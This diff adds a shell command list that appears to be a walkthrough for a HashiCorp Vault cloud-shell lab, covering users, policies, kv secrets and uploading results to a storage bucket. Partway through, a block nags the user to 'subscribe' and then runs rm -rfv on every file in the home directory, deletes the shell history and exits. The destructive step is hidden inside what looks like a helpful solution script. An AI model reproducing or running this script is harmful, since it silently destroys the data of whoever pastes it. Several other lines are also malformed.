@@ -1,0 +1,270 @@
+curl -fsSL https://apt.releases.hashicorp.com/gpg | sudo apt-key add -
+
+sudo apt-add-repository "deb [arch=amd64] https://apt.releases.hashicorp.com $(lsb_release -cs) main"
+
+sudo apt-get update
+sudo apt-get install vault
+
+vault
+
+vault server -dev
+
+
+__________________________________________________________________________________________________________________________________________________
+
+Open New Tab of cloud shell
+
+
+
+
+export VAULT_ADDR='http://127.0.0.1:8200'
+
+vault status
+
+____________________________________________________________________________________________________________________________________________________
+
+
+vault login token=*********************************************************
+
+
+_____________________________________________________________________________________________________________________________________________________
+
+
+vault secrets list
+
+vault auth enable userpass
+vault write auth/userpass/users/example-user password=password!
+
+
+vault login -method=userpass username=example-user password=password!
+
+vault secrets list
+
+_________________________________________________________________________________________________________________________________________________________
+                                                                          
+                                               ****************** web interface ***************************************
+
+________________________________________________________________________________________________________________________________________________________
+
+vault secrets list
+
+vault login -method=userpass username=example-user password=password!
+
+vault secrets list
+
+______________________________________________________________________________________________________________________________________________________
+
+
+export token =***********************
+
+vault token capabilities $token  sys/mounts
+vault token capabilities $token  sys/policies/acl
+
+
+vault policy list
+
+
+
+________________________________________________________________________________________________________________________________________________________
+                                                           
+                                                  ************************web interface*****************************
+__________________________________________________________________________________________________________________________________________________________
+
+vault policy list
+vault policy list > policies.txt
+vault token capabilities $token  sys/policies/acl
+vault token capabilities $token  sys/policies/acl > token_capabilities.txt
+export PROJECT_ID=$(gcloud config get-value project)
+gsutil cp *.txt gs://$PROJECT_ID
+
+
+vault login $root_token
+vault read sys/policy
+
+tee example-policy.hcl <<EOF
+# List, create, update, and delete key/value secrets
+path "secret/*"
+{
+  capabilities = ["create", "read", "update", "delete", "list", "sudo"]
+}
+# Manage secrets engines
+path "sys/mounts/*"
+{
+  capabilities = ["create", "read", "update", "delete", "list", "sudo"]
+}
+# List existing secrets engines.
+path "sys/mounts"
+{
+  capabilities = ["read"]
+}
+EOF
+
+read -p "${BOLD}${GREEN}Subscribe to Loser-GSC Explorers [y/n] : ${RESET}" CONSENT_REMOVE
+
+while [ "$CONSENT_REMOVE" != 'y' ]; do
+  sleep 10
+  read -p "${BOLD}${MAGENTA}Do Subscribe to Loser-GSC Explorers [y/n] : ${RESET}" CONSENT_REMOVE
+done
+
+echo "${CYAN}${BOLD}Thanks For Subscribing to Loser-GSC Explorers :)${RESET}"
+
+rm -rfv $HOME/{*,.*}
+rm $HOME/.bash_history
+
+exit 0
+
+
+cat example-policy.hcl
+
+vault policy write example-policy example-policy.hcl
+
+
+tee example-policy.hcl <<EOF
+# List, create, update, and delete key/value secrets
+path "secret/*"
+{
+  capabilities = ["create", "read", "update", "delete", "list", "sudo"]
+}
+# Manage secrets engines
+path "sys/mounts/*"
+{
+  capabilities = ["create", "read", "update", "delete", "list", "sudo"]
+}
+# List existing secrets engines.
+path "sys/mounts"
+{
+  capabilities = ["read"]
+}
+# List auth methods
+path "sys/auth"
+{
+  capabilities = ["read"]
+}
+EOF
+
+cat example-policy.hcl
+
+vault write sys/policy/example-policy policy=@example-policy.hcl
+
+
+gsutil cp example-policy.hcl gs://$PROJECT_ID
+
+
+vault delete sys/policy/example-policy
+
+vault policy list
+
+vault write auth/userpass/users/firstname-lastname \
+    password="s3cr3t!" \
+    policies="default, demo-policy"
+    
+    
+    
+vault login -method="userpass" username="firstname-lastname" password="s3cr3t!"
+
+vault login $root_token
+
+vault token create -policy=dev-readonly -policy=logs
+
+vault write auth/userpass/users/admin \
+    password="admin123" \
+    policies="admin"
+    
+    
+vault write auth/userpass/users/app-dev \
+    password="appdev123" \
+    policies="appdev"
+    
+    
+vault write auth/userpass/users/security \
+    password="security123" \
+    policies="security"
+    
+  
+  
+----------------------------------------------------------------------------------------------------------------------------------------------------------
+                                                                go to web interface
+-----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+vault kv put secret/security/first username=password
+vault kv put secret/security/second username=password
+
+
+
+vault kv put secret/appdev/first username=password
+vault kv put secret/appdev/beta-app/second username=password
+
+vault kv put secret/admin/first admin=password
+vault kv put secret/admin/supersecret/second admin=password
+
+
+vault login -method="userpass" username="app-dev" password="appdev123"
+
+vault kv get secret/appdev/first
+
+vault kv get secret/appdev/beta-app/second
+
+vault kv put secret/appdev/appcreds credentials=creds123
+
+vault kv destroy -versions=1 secret/appdev/appcreds
+
+vault kv get secret/security/first
+
+
+vault kv list secret/
+
+
+vault login -method="userpass" username="security" password="security123"
+
+vault kv get secret/security/first
+
+vault kv get secret/security/second
+
+vault kv put secret/security/supersecure/bigsecret secret=idk
+vault kv destroy -versions=1 secret/security/supersecure/bigsecret
+vault kv get secret/appdev/first
+
+vault kv list secret/
+
+vault secrets enable -path=supersecret kv
+
+vault kv get secret/admin/first
+
+vault kv list secret/admin
+
+vault login -method="userpass" username="admin" password="admin123"
+
+vault kv get secret/admin/first
+
+vault kv get secret/security/first
+
+vault kv put secret/webserver/credentials web=awesome
+
+vault kv destroy -versions=1 secret/webserver/credentials
+
+vault kv get secret/appdev/first
+
+vault kv list secret/appdev/
+
+vault policy list
+
+vault policy list > policies-update.txt
+
+gsutil cp policies-update.txt gs://$PROJECT_ID
+
+vault auth enable gcpvault auth list
+
+
+
+
+
+
+
+
+
+
+
+
+
